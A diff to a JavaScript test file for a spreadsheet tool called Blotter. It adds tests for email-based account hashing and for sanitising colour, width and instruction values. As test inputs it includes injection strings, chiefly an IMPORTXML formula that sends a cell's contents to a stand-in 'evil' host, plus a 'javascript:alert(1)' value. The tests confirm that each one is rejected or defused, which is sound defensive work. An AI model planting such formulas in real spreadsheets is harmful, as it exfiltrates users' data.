@@ -66,7 +66,8 @@ const EXPORTS = [
   // typo in a hex paints a cell black on somebody's real sheet.
   'asSheetDate_', 'STATUS_STYLE', 'THEMES', 'CONTACTS_WIDTHS', 'FOUND_WIDTHS',
   'duplicateBlotterHeadings_', 'formulasInBlotterColumns_', 'overwrittenFormulaWarnings_',
-  'rowsThatMoved_',
+  'rowsThatMoved_', 'accountHash_', 'sanitiseDesign_', 'safeColour_', 'safeNumber_',
+  'safeCell_', 'statusStyle_', 'columnWidth_', 'numberFormat_', 'SETTING_KEY',
   'instructionRows_', 'expectedSetup_', 'SETTING_INSTALL_ID', 'SETTING_HELP',
   'COL_NAME', 'COL_TITLE', 'COL_FIRM', 'COL_EMAIL', 'COL_CLOSED',
   'BLOTTER_COLUMNS', 'FOUND_HEADERS',
@@ -899,6 +900,109 @@ function sheetWithHeaders(name, headerRowCells, extraRows = []) {
   eq('and names Step 1 as the repair', /Step 1: Set up this sheet/i.test(text), true);
   eq('and gives a way to reach a human', text.includes('jnachman17@gmail.com'), true);
 }
+
+/* ------------------------------------------------------------------ *
+ * The account pseudonym, and the hole that had to be closed first.
+ *
+ * Amendment A3: Session.getEffectiveUser().getEmail() really can come back
+ * empty. Hash that and every install in the same state shares one identity,
+ * and a single key unlocks all of them. Absence is a state; it must never
+ * become a value.
+ * ------------------------------------------------------------------ */
+{
+  global.Utilities.computeDigest = (_alg, text) => {
+    // A stand-in that is deterministic and collides for equal inputs, which is
+    // all these assertions need. The real digest is Google's.
+    let h = 0;
+    for (let i = 0; i < text.length; i++) h = (h * 31 + text.charCodeAt(i)) >>> 0;
+    return Array.from({ length: 32 }, (_, i) => ((h >>> (i % 4 * 8)) & 0xff) - 128);
+  };
+  global.Utilities.DigestAlgorithm = { SHA_256: 'SHA_256' };
+  global.Utilities.Charset = { UTF_8: 'UTF_8' };
+
+  const withEmail = (email) => {
+    global.Session = { getEffectiveUser: () => ({ getEmail: () => email }) };
+    return new Function('box', `${src}\nObject.assign(box, {accountHash_});`);
+  };
+  const hashFor = (email) => {
+    const b = {};
+    withEmail(email)(b);
+    return b.accountHash_();
+  };
+
+  eq('an empty address produces NO hash at all', hashFor(''), null);
+  eq('whitespace is still nothing', hashFor('   '), null);
+  eq('and so is an address Apps Script could not read', hashFor(null), null);
+  eq('a real address produces a hash', typeof hashFor('jon@utexas.edu'), 'string');
+  eq('the same person hashes the same twice',
+    hashFor('jon@utexas.edu'), hashFor('jon@utexas.edu'));
+  eq('capitalisation is not a different person',
+    hashFor('Jon@UTexas.edu'), hashFor('jon@utexas.edu'));
+  eq('two people are two identities',
+    hashFor('jon@utexas.edu') !== hashFor('someone@else.edu'), true);
+  eq('and an empty one is not quietly the same as a real one',
+    hashFor('') === hashFor('jon@utexas.edu'), false);
+}
+
+/* ------------------------------------------------------------------ *
+ * The design payload. A courier that renders what it is told can be told
+ * to write anything, so every value is checked rather than trusted.
+ * ------------------------------------------------------------------ */
+
+eq('a real colour passes', box.safeColour_('#1a73e8'), '#1a73e8');
+eq('three-digit shorthand does not', box.safeColour_('#abc'), null);
+eq('a colour name does not', box.safeColour_('red'), null);
+eq('nor does a formula wearing a colour’s clothes',
+  box.safeColour_('=IMPORTXML("http://x")'), null);
+eq('a bounded number passes', box.safeNumber_('120', 24, 600), 120);
+eq('one below the floor does not', box.safeNumber_(2, 24, 600), null);
+eq('one above the ceiling does not', box.safeNumber_(90000, 24, 600), null);
+eq('nonsense does not', box.safeNumber_('wide', 24, 600), null);
+
+{
+  const clean = box.sanitiseDesign_({
+    version: 'v1',
+    status_style: { Sent: { bg: '#dfe3e8', fg: '#3c4043' } },
+    widths: { contacts: { Name: 160 }, found: { Email: 200 } },
+    number_formats: { 'Last contact': 'm/d/yy' },
+    state_rank: { Sent: 20 },
+    instructions: [{ kind: 'h2', a: 'A heading' }],
+  });
+  eq('a well-formed payload survives intact', clean.status_style.Sent.bg, '#dfe3e8');
+  eq('and its widths', clean.widths.contacts.Name, 160);
+  eq('and its ranks', clean.state_rank.Sent, 20);
+  eq('and its rows', clean.instructions[0].a, 'A heading');
+}
+
+{
+  const dirty = box.sanitiseDesign_({
+    status_style: {
+      Sent: { bg: 'javascript:alert(1)', fg: '#000000' },   // not a colour
+      Nonsense: { bg: '#ffffff', fg: '#000000' },           // not a status
+    },
+    widths: { contacts: { Name: 99999, Sneaky: 100 } },     // out of range; unknown heading
+    state_rank: { Sent: 'first' },
+    instructions: [
+      { kind: 'h2', a: '=IMPORTXML("https://evil/"&A2)' },  // a live formula
+      { kind: 'script', a: 'something new' },               // a kind we cannot draw
+    ],
+  });
+  eq('a colour that is not a colour is dropped', dirty.status_style, undefined);
+  eq('a width out of range is dropped, and so is a heading Blotter does not own',
+    dirty.widths, undefined);
+  eq('a rank that is not a number is dropped', dirty.state_rank, undefined);
+  eq('a formula in copy is defused, not executed',
+    dirty.instructions[0].a.charAt(0), "'");
+  eq('and an unknown row kind is ignored rather than guessed at',
+    dirty.instructions.length, 1);
+}
+
+eq('a payload that is not an object at all', box.sanitiseDesign_('hello'), null);
+eq('nor null', box.sanitiseDesign_(null), null);
+
+/* The key field exists, empty and harmless, from today. */
+eq('there is somewhere for a key to go', box.SETTING_KEY, 'Blotter key');
+eq('and Step 1 creates it', box.expectedSetup_().settings.includes(box.SETTING_KEY), true);
 
 console.log(fails === 0
   ? `All ${checks} courier helper checks passed.`
